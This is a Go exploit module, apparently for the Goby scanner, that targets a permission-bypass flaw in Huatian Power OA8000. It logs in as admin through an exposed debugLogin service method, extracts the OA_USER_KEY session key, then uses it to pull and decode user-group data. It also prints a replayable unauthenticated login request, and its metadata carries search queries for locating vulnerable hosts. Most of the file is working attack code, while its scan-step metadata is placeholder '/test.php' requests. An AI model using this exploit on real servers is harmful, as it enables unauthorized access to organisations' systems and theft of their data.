package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Huatian Power OA /OAapp/HtEntranceService.do Permission Bypass Vulnerability",
    "Description": "<p>Huatian Dynamics OA /OAapp/HtEntranceService.do has a Permission Bypass vulnerability. An attacker can use this vulnerability to execute malicious commands, leading to a server takeover.</p>",
    "Product": "Huatian-OA8000",
    "Homepage": "http://www.oa8000.com/",
    "DisclosureDate": "2023-02-14",
    "PostTime": "2024-04-26",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "GobyQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "Level": "3",
    "Impact": "<p>Huatian Dynamics OA /OAapp/HtEntranceService.do has a Permission Bypass vulnerability. An attacker can use this vulnerability to execute malicious commands, leading to a server takeover.</p>",
    "Recommendation": "<p>An official security fix has been released. Please go to the official website to upgrade to the latest version: <a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "Default,Information",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2023",
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "华天动力OA /OAapp/HtEntranceService.do 权限绕过漏洞",
            "Product": "华天动力-OA8000",
            "Description": "<p>华天动力OA /OAapp/HtEntranceService.do存在权限绕过漏洞。攻击者可以利用此漏洞执行恶意命令，从而导致服务器被接管。<br><br></p>",
            "Recommendation": "<p>官方安全修复版本已发布。请到官网升级到最新版本：<a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a><br></p>",
            "Impact": "<p>华天动力OA /OAapp/HtEntranceService.do存在权限绕过漏洞。攻击者可以利用此漏洞执行恶意命令，从而导致服务器被接管。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "HW-2023",
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Huatian Power OA /OAapp/HtEntranceService.do Permission Bypass Vulnerability",
            "Product": "Huatian-OA8000",
            "Description": "<p>Huatian Dynamics OA /OAapp/HtEntranceService.do has a Permission Bypass vulnerability. An attacker can use this vulnerability to execute malicious commands, leading to a server takeover.<br></p>",
            "Recommendation": "<p>An official security fix has been released. Please go to the official website to upgrade to the latest version: <a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a><br></p>",
            "Impact": "<p>Huatian Dynamics OA /OAapp/HtEntranceService.do has a Permission Bypass vulnerability. An attacker can use this vulnerability to execute malicious commands, leading to a server takeover.<br><br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "HW-2023",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	var base64Decoded6c4c34a168 = func(decodedcontent string) (string, error) {
		// Base64解码
		decoded, err := base64.StdEncoding.DecodeString(decodedcontent)
		if err != nil {
			return "", fmt.Errorf("can't decode base64 content")
		}
		return string(decoded), nil
	}

	var makeRegularea8a706c4c34a168 = func(RegularContent string, RegularUrl string) (string, error) {
		reRequestAAAA := regexp.MustCompile(RegularUrl)
		if !reRequestAAAA.MatchString(RegularContent) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequestAAAA.FindStringSubmatch(RegularContent)
		return getname[1], nil
	}

	var runCommandAdufcnadf34123 = func(u *httpclient.FixUrl) (string, error) {
		uri := "/OAapp/HtEntranceService.do"
		payload := `{"service":"debugService","method":"debugLogin","code":"admin","params":"['1','CN',99]"}`
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.Timeout = 15

		cfg.Header.Store("Content-Type", " application/x-www-form-urlencoded")
		cfg.Data = payload
		resp, err := httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return "", err
		}
		if !strings.Contains(resp.HeaderString.String(), `OA_USER_KEY`) {
			return "", errors.New(`command exec failed`)
		}
		key, err := makeRegularea8a706c4c34a168(resp.HeaderString.String(), "OA_USER_KEY=([^\r]*)")
		payload = `{"userId":"admin","code":"` + key + `","params":[{"serviceName":"commService","methodName":"getUserGroupList","params":"WycnXQx7x;x7x;"}]}`
		cfg = httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.Timeout = 15

		cfg.Header.Store("Content-Type", " application/x-www-form-urlencoded")
		cfg.Data = payload
		resp, err = httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return "", err
		}
		decodedcontent, err := base64Decoded6c4c34a168(resp.Utf8Html)
		if !strings.Contains(decodedcontent, `"type":1`) {
			return "", errors.New(`response failed`)
		}

		return decodedcontent, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			_, err := runCommandAdufcnadf34123(u)
			if err != nil {
				return false
			}
			ss.VulURL = u.FixedHostInfo + "/OAapp/HtEntranceService.do"
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			resp, err := runCommandAdufcnadf34123(expResult.HostInfo)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if attackType == "Default" {
				expResult.Success = true
				expResult.Output = "存在未授权登录，请根据以下数据包未授权登录\r\nPOST /OAapp/HtEntranceService.do HTTP/1.1\r\nHost: " + expResult.HostInfo.FixedHostInfo + "\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\r\nContent-Length: 88\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n\r\n{\"service\":\"debugService\",\"method\":\"debugLogin\",\"code\":\"admin\",\"params\":\"['1','CN',99]\"}"
				return expResult
			} else if attackType == "Information" {
				expResult.Success = true
				expResult.Output = resp
			}
			return expResult
		},
	))
}
